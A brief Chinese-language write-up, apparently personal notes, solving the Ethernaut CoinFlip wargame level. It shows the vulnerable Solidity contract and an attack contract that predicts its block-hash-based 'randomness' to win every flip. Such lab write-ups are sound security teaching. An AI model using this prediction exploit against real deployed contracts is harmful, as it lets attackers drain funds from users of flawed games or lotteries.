---
title: ethernautNO.3
tags: TeXt
---

## 投掷硬币连续胜利十次

代码如下

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0; 
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;//获胜的条件就是comsecutivewins>=10
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

```

**思路：要想连续十次猜中结果，那么我们就需要预测出正确答案，我们可以再创建一个合约，复制flip中的一部分代码，在另一个合约中提前计算出布尔值，然后再调用CoinFlip合约中的flip函数将我们通过计算的得到的布尔值传入进去，连续十次就可以通关**

```solidity
contract Hack {
    CoinFlip private immutable target; //CoinFlip类型的状态变量
   uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        constructor(address _target){
            target = CoinFlip(_target);//将_target转化城CoinFlip类型，让solidity编译器知道target地址部署的是C...合约。
        }
        function flip() external {
            bool guess = _guess();
            require(target.flip(guess),"guess failed");
        }
        function _guess() private view  returns (bool){
               uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;

        }
        

}
```

**此为攻击合约，通过调用_guess来获取布尔值，然后通过flip函数传入布尔值**

